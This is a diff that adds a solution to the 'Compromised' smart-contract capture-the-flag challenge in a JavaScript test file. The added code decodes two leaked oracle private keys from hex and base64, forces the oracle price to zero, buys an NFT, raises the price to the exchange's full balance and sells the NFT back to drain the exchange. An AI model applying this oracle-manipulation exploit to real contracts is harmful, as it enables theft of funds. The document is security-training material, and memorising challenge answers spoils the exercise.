@@ -53,6 +53,47 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let key1 = '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35'
+        let key2 = '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34'
+        const parsePrivateKey = (key) => {
+            key = key.split(' ')
+            key = key.map(item => parseInt('0x' + item))
+            key = key.map(item => String.fromCharCode(item)).join('')
+            console.log('key: ', key)
+            // return atob(key)
+            return Buffer.from(key, 'base64').toString('utf-8');
+        }
+   
+        let privateKey1 = parsePrivateKey(key1)
+        let privateKey2 = parsePrivateKey(key2)
+        console.log('privateKey1: ', privateKey1, privateKey2)
+
+        const provider = ethers.provider
+
+        let wallet1 = new ethers.Wallet(privateKey1, provider);
+        let wallet2 = new ethers.Wallet(privateKey2, provider);
+        console.log('done wallet: ')
+
+        const price = 0
+        const nftSymbol = await nftToken.symbol()
+        console.log('price: ', price, nftSymbol)
+        await oracle.connect(wallet1).postPrice(nftSymbol, price)
+        await oracle.connect(wallet2).postPrice(nftSymbol, price)
+        console.log('done post price: ')
+
+        const tx = await exchange.connect(player).buyOne({
+            value: 1
+        })
+        const receipt = await tx.wait()
+        console.log('done buyOne: ', receipt.events[1].args[1])
+        const id = receipt.events[1].args[1]
+
+        const balance = await ethers.provider.getBalance(exchange.address)
+        await oracle.connect(wallet1).postPrice(nftSymbol, balance)
+        await oracle.connect(wallet2).postPrice(nftSymbol, balance)
+
+        await nftToken.connect(player).approve(exchange.address, id)
+        await exchange.connect(player).sellOne(id)
     });
 
     after(async function () {
